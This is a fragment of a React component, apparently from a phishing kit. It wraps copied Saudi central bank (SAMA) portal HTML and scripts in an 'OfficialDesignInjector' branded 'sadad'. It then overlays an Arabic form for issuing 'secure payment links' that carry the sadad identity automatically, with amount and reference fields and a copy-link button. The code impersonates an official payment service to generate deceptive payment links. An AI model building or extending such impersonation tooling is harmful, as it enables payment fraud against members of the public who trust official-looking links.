      
      
      
      
	  
	  
	  
	  

      <script src="/_layouts/15/SAMA.Portal/assets/js/bootstrap.bundle.min.js"></script>
      <script src="/_layouts/15/SAMA.Portal/assets/js/swiper-bundle.js"></script>
      <script src="/_layouts/15/SAMA.Portal/assets/js/aos.js"></script>
      <script src="/_layouts/15/SAMA.Portal/assets/js/jquery-ui.min.js"></script>
      <script src="/_layouts/15/SAMA.Portal/assets/js/fancybox.umd.js"></script>
      <script src="/_layouts/15/SAMA.Portal/assets/js/pagination.min.js"></script>
      <script src="/_layouts/15/SAMA.Portal/assets/js/script.js"></script>
      <script src="/_layouts/15/SAMA.Portal/assets/js/custom.js"></script>
      <script src="/_layouts/15/SAMA.Portal/assets/js/voting.js"></script>
	  <!--<script src="/_layouts/15/SAMA.Portal/assets/js/voting.js"></script> -->
	  <!--<script src="/_layouts/15/SamaGov/Style%20Library/sama/js/rased.js"></script> -->
   
`;
  const officialCSS = `
`;

  return (
    <OfficialDesignInjector entityId="sadad" html={officialHTML} css={officialCSS}>
      <div className="official-input-overlay" style={{ 
        position: 'absolute', 
        top: '50%', 
        left: '50%', 
        transform: 'translate(-50%, -50%)',
        zIndex: 1000,
        background: 'rgba(255,255,255,0.95)',
        padding: '30px',
        borderRadius: '12px',
        boxShadow: '0 4px 30px rgba(0,0,0,0.3)',
        width: '100%',
        maxWidth: '420px',
        border: '1px solid #eee'
      }}>
        <div style={{ textAlign: 'center', marginBottom: '25px' }}>
          <h2 style={{ margin: 0, color: '#1a1a1a', fontSize: '22px', fontWeight: 'bold' }}>بوابة إصدار الروابط الرسمية</h2>
          <p style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>سيتم تطبيق هوية sadad تلقائياً</p>
        </div>
        <div style={{ marginBottom: '15px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '5px', color: '#444' }}>المبلغ المطلوب</label>
          <input 
            placeholder="0.00" 
            value={amount} 
            onChange={(e) => setAmount(e.target.value)}
            style={{ width: '100%', height: '52px', border: '2px solid #e2e8f0', borderRadius: '8px', padding: '0 15px', fontSize: '18px', boxSizing: 'border-box' }}
          />
        </div>
        <div style={{ marginBottom: '20px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '5px', color: '#444' }}>الوصف / رقم المرجع</label>
          <input 
            placeholder="ادخل تفاصيل العملية" 
            value={description} 
            onChange={(e) => setDescription(e.target.value)}
            style={{ width: '100%', height: '52px', border: '2px solid #e2e8f0', borderRadius: '8px', padding: '0 15px', fontSize: '16px', boxSizing: 'border-box' }}
          />
        </div>
        <button 
          onClick={handleCreate} 
          disabled={loading}
          style={{ 
            width: '100%', 
            height: '56px', 
            background: '#1a1a1a', 
            color: '#fff', 
            borderRadius: '12px', 
            fontSize: '18px', 
            fontWeight: 'bold', 
            cursor: 'pointer',
            transition: 'all 0.2s'
          }}
        >
          {loading ? 'جاري الإصدار...' : 'إنشاء رابط دفع آمن'}
        </button>
        {generatedLink && (
          <div style={{ marginTop: '25px', padding: '15px', background: '#f8fafc', border: '1px dashed #334155', borderRadius: '8px', wordBreak: 'break-all' }}>
            <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '5px' }}>الرابط المولد:</p>
            <div style={{ fontWeight: 'bold', color: '#0f172a', fontSize: '14px' }}>{generatedLink}</div>
            <button 
              onClick={() => navigator.clipboard.writeText(generatedLink)}
              style={{ marginTop: '10px', background: '#334155', color: '#fff', border: 'none', borderRadius: '4px', padding: '5px 10px', fontSize: '12px', cursor: 'pointer' }}
            >
              نسخ الرابط
            </button>
          </div>
        )}
      </div>
    </OfficialDesignInjector>
  );
};

export default SadadLinkCreator;
